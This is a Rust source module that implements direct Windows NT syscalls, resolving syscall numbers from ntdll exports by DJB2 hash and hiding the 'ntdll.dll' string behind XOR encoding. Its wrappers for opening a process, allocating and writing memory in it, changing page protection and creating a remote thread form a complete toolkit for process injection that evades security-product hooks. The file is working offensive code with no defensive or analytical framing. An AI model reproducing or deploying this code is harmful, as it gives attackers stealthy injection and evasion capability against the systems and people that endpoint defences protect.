//! Direct NT syscalls resolved from ntdll.dll at runtime.
//!
//! Syscall numbers (SSN) are parsed from ntdll export stubs:
//! `4C 8B D1 B8 XX XX XX XX` (`mov r10, rcx`; `mov eax, SSN`).
//!
//! `SYSCALL_NUMBERS` index map (resolved via DJB2 export hash):
//! - 0: open process
//! - 1: allocate virtual memory
//! - 2: write virtual memory
//! - 3: create thread ex
//! - 4: read virtual memory
//! - 5: protect virtual memory
//! - 6: close handle

use core::arch::asm;
use std::ffi::c_void;
use std::mem;
use std::sync::Once;

use windows::core::PCWSTR;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::LibraryLoader::GetModuleHandleW;

pub type NTSTATUS = i32;

const H_NT_OPEN_PROCESS: u32 = 0x5003_C058;
const H_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793_C34C;
const H_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95F3_A792;
const H_NT_CREATE_THREAD_EX: u32 = 0xCB0C_2130;
const H_NT_READ_VIRTUAL_MEMORY: u32 = 0xC240_62E3;
const H_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x0829_62C8;
const H_NT_CLOSE: u32 = 0x8B8E_133D;

const SSN_OPEN_PROCESS: usize = 0;
const SSN_ALLOCATE_VIRTUAL_MEMORY: usize = 1;
const SSN_WRITE_VIRTUAL_MEMORY: usize = 2;
const SSN_CREATE_THREAD_EX: usize = 3;
const SSN_READ_VIRTUAL_MEMORY: usize = 4;
const SSN_PROTECT_VIRTUAL_MEMORY: usize = 5;
const SSN_CLOSE: usize = 6;

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub length: u32,
    pub root_directory: HANDLE,
    pub object_name: *mut c_void,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

impl Default for OBJECT_ATTRIBUTES {
    fn default() -> Self {
        Self {
            length: mem::size_of::<Self>() as u32,
            root_directory: HANDLE::default(),
            object_name: std::ptr::null_mut(),
            attributes: 0,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
pub struct CLIENT_ID {
    pub unique_process: *mut c_void,
    pub unique_thread: *mut c_void,
}

#[repr(C)]
struct ImageExportDirectory {
    _characteristics: u32,
    _time_date_stamp: u32,
    _major: u16,
    _minor: u16,
    _name: u32,
    _base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

static mut SYSCALL_NUMBERS: Option<[usize; 7]> = None;
static INIT: Once = Once::new();

#[inline]
const fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

fn hash_cstr(name: &[u8]) -> u32 {
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    let mut h: u32 = 5381;
    for &b in &name[..end] {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

unsafe fn export_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
    if module_base.is_null() {
        return None;
    }
    let dos = module_base as *const u16;
    if *dos != 0x5A4D {
        return None;
    }
    let e_lfanew = *(module_base.add(0x3C) as *const i32);
    let nt = module_base.add(e_lfanew as usize);
    if *(nt as *const u32) != 0x0000_4550 {
        return None;
    }
    let opt = nt.add(4 + 20);
    let magic = *(opt as *const u16);
    let export_rva = if magic == 0x20B {
        *(opt.add(112) as *const u32)
    } else if magic == 0x10B {
        *(opt.add(96) as *const u32)
    } else {
        return None;
    };
    if export_rva == 0 {
        return None;
    }
    let exp = &*(module_base.add(export_rva as usize) as *const ImageExportDirectory);
    for i in 0..exp.number_of_names {
        let name_rva = *(module_base
            .add(exp.address_of_names as usize + i as usize * 4) as *const u32);
        let name_ptr = module_base.add(name_rva as usize);
        let name_len = (0..256).find(|&j| *name_ptr.add(j) == 0).unwrap_or(256);
        if hash_cstr(std::slice::from_raw_parts(name_ptr, name_len)) != target_hash {
            continue;
        }
        let ordinal = *(module_base
            .add(exp.address_of_name_ordinals as usize + i as usize * 2) as *const u16)
            as u32;
        let func_rva = *(module_base
            .add(exp.address_of_functions as usize + ordinal as usize * 4) as *const u32);
        return Some(module_base.add(func_rva as usize));
    }
    None
}

fn s_ntdll() -> String {
    crate::xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
}

fn wide(s: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
    let bytes = std::slice::from_raw_parts(addr, 32);
    if bytes.len() >= 8
        && bytes[0] == 0x4C
        && bytes[1] == 0x8B
        && bytes[2] == 0xD1
        && bytes[3] == 0xB8
    {
        return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as usize);
    }
    for i in 0..bytes.len().saturating_sub(4) {
        if bytes[i] == 0xB8 {
            return Some(
                u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]])
                    as usize,
            );
        }
    }
    None
}

/// Lazily resolve syscall numbers from ntdll exports.
pub fn init() {
    INIT.call_once(|| {
        unsafe {
            let ntdll_name = wide(&s_ntdll());
            let ntdll = match GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) {
                Ok(m) => m,
                Err(_) => return,
            };
            let base = ntdll.0 as *const u8;
            let hashes = [
                H_NT_OPEN_PROCESS,
                H_NT_ALLOCATE_VIRTUAL_MEMORY,
                H_NT_WRITE_VIRTUAL_MEMORY,
                H_NT_CREATE_THREAD_EX,
                H_NT_READ_VIRTUAL_MEMORY,
                H_NT_PROTECT_VIRTUAL_MEMORY,
                H_NT_CLOSE,
            ];
            let mut numbers = [0usize; 7];
            for (idx, hash) in hashes.iter().enumerate() {
                numbers[idx] = export_by_hash(base, *hash)
                    .and_then(|addr| parse_syscall_number(addr))
                    .unwrap_or(0);
            }
            SYSCALL_NUMBERS = Some(numbers);
        }
    });
}

unsafe fn ssn(index: usize) -> u32 {
    SYSCALL_NUMBERS.unwrap_unchecked()[index] as u32
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall1(ssn: u32, a1: usize) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        lateout("rax") status,
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") status,
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall5(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall6(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "mov qword ptr [rsp + 0x30], {a6}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall11(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "mov qword ptr [rsp + 0x30], {a6}",
        "mov qword ptr [rsp + 0x38], {a7}",
        "mov qword ptr [rsp + 0x40], {a8}",
        "mov qword ptr [rsp + 0x48], {a9}",
        "mov qword ptr [rsp + 0x50], {a10}",
        "mov qword ptr [rsp + 0x58], {a11}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall1(_: u32, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall4(_: u32, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall5(_: u32, _: usize, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall6(
    _: u32,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall11(
    _: u32,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
) -> NTSTATUS {
    -1
}

/// Direct syscall for `NtOpenProcess`.
pub unsafe fn nt_open_process(
    process_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *const OBJECT_ATTRIBUTES,
    client_id: *const CLIENT_ID,
) -> NTSTATUS {
    init();
    do_syscall4(
        ssn(SSN_OPEN_PROCESS),
        process_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        client_id as usize,
    )
}

/// Direct syscall for `NtAllocateVirtualMemory`.
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    init();
    do_syscall6(
        ssn(SSN_ALLOCATE_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        zero_bits,
        region_size as usize,
        allocation_type as usize,
        protect as usize,
    )
}

/// Direct syscall for `NtWriteVirtualMemory`.
pub unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut c_void,
    buffer: *const c_void,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_WRITE_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        buffer as usize,
        buffer_size,
        bytes_written as usize,
    )
}

/// Direct syscall for `NtCreateThreadEx`.
pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut c_void,
    process_handle: HANDLE,
    start_routine: *mut c_void,
    argument: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> NTSTATUS {
    init();
    do_syscall11(
        ssn(SSN_CREATE_THREAD_EX),
        thread_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        process_handle.0 as usize,
        start_routine as usize,
        argument as usize,
        create_flags as usize,
        zero_bits,
        stack_size,
        maximum_stack_size,
        attribute_list as usize,
    )
}

/// Direct syscall for `NtReadVirtualMemory`.
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: *const c_void,
    buffer: *mut c_void,
    buffer_size: usize,
    bytes_read: *mut usize,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_READ_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        buffer as usize,
        buffer_size,
        bytes_read as usize,
    )
}

/// Direct syscall for `NtProtectVirtualMemory`.
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_PROTECT_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        region_size as usize,
        new_protect as usize,
        old_protect as usize,
    )
}

/// Direct syscall for `NtClose`.
pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
    init();
    do_syscall1(ssn(SSN_CLOSE), handle.0 as usize)
}

/// Pseudo-handle for the current process (`GetCurrentProcess` / `-1`).
pub fn current_process() -> HANDLE {
    HANDLE(-1isize as *mut c_void)
}

/// Close a kernel handle via direct syscall.
pub unsafe fn close_handle(handle: HANDLE) -> Result<(), ()> {
    if nt_success(nt_close(handle)) {
        Ok(())
    } else {
        Err(())
    }
}

/// Change page protection for the current process via direct syscall.
pub unsafe fn protect_memory(
    base: *mut c_void,
    size: usize,
    new_protect: u32,
) -> Result<(), ()> {
    let mut base_ptr = base;
    let mut region_size = size;
    let mut old = 0u32;
    let status = nt_protect_virtual_memory(
        current_process(),
        &mut base_ptr,
        &mut region_size,
        new_protect,
        &mut old,
    );
    if nt_success(status) {
        Ok(())
    } else {
        Err(())
    }
}
